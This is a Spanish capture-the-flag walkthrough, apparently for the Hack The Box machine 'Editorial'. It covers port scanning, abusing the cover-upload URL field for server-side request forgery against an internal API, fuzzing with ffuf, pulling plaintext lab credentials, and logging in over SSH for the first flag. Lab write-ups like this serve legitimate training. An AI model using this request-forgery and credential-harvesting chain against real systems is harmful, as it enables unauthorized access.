# Reconocimiento
> sudo nmap -sS -sV -A --min-rate 5000 --open -vvv -Pn 10.10.11.20

- Puertos encontrados

| Resultados |
|-----------|
|22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)|
|80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|

- Revisamos la web montada en el servicio http
  
> Colocamos en la barra del navegador la ip de la maquina y obtenemos un nombre de url
> http://editorial.htb/

- Colocamos la ip en el archivo Hosts de nuestra maquina atacante
  
> sudo nano /etc/hosts

> 10.10.11.20 editorial.htb

- Abrimos bursuite
- Habilitamos para interceptar las peticiones
- Dentro de la web, tenemos una seccion para cargar una imagen mediante url
- Colocamos el local host

> http://127.0.0.1  

- Le damos al boton de preview
- Colocamos la peticion en repeter en burpsuite
- le damos a send dentro de repeater
- obtenemos el siguiente resultado

> /static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg

- realizamos un analisis con ffuf

> ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Infrastructure/common-http-ports.txt -request post.req -u http://editorial.htb/upload-cover -fs 61

- obtenemos estado 200 en el puerto 5000
- luego nuevamente dentro de burpsuite nos colocamos para interceptar
- dentro de la web colocamos

> http://127.0.0.1:500

- capturamos y mandamos a repeter y luego send
- obtenemos lo siguiente

> static/uploads/859593e2-21ca-4ab7-9343-8ab25e6b253e

- esto lo colocamos dentro de la web de la siguiente manera

> http://127.0.0.1:5000/static/uploads/859593e2-21ca-4ab7-9343-8ab25e6b253e

- esto va a mostar una carga con error le damos click derecho a la imagen rota y le damos a abrir en una ventana nueva
- eso nos va a permitir descargar una archivo
- luego que descargamos revisamos el contenido

----------------------------------------------------------
{"messages"
:[{"promotions":{"description":"Retrieve a list of all the promotions in our library.",
"endpoint":"/api/latest/metadata/messages/promos",
"methods":"GET"}},

{"coupons":{"description":"Retrieve the list of coupons to use in our library.",
"endpoint":"/api/latest/metadata/messages/coupons",
"methods":"GET"}},

{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.",
"endpoint":"/api/latest/metadata/messages/authors",
"methods":"GET"}},

{"platform_use":{"description":"Retrieve examples of how to use the platform.",
"endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],
"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.",
"endpoint":"/api/latest/metadata/changelog","methods":"GET"}},

{"latest":{"description":"Retrieve the last version of api.",
"endpoint":"/api/latest/metadata",
"methods":"GET"}}]}
----------------------------------------------------------

- revisamos cada una de las url a ver que podemos obtener
- lo pegamos en la seccion de url de la web de la siguiente manera

> http://127.0.0.1:5000/api/latest/metadata/messages/authors

- le damos en la imagen rota click derecho y abrir en una nueva ventana y descargamos
-  revisamos el contenido

----------------------------------------------------------
{"template_mail_message":
"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.
\n\nYour login credentials for our internal forum and authors site are
:\n     Username: dev
\n     Password: dev080217_devAPI!@
\nPlease be sure to change your password as soon as possible for security purposes.
\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.
\n\nBest regards, Editorial Tiempo Arriba Team."}
----------------------------------------------------------

- obtenemos el usuario y la contrasena

| user | password |
|------|----------|
| dev | dev080217_devAPI!@ |

- intentamos ingresar por ssh con estos datos

> sshpass -p "dev080217_devAPI!@" dev@10.10.11.20

- al ingresar podemos ver la primera flag








